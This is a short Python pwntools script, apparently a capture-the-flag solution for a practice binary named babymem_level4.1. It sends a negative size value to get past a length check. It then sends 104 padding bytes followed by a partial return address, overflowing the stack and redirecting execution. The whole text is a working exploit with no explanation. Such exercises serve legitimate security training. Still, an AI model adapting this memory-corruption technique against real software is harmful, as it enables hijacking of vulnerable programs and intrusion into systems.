import pwn
r = pwn.process("/challenge/babymem_level4.1")
r.sendline("-111")
r.send(b'\x00'*104+b'\x30\x1d\x40')
print(r.readall())
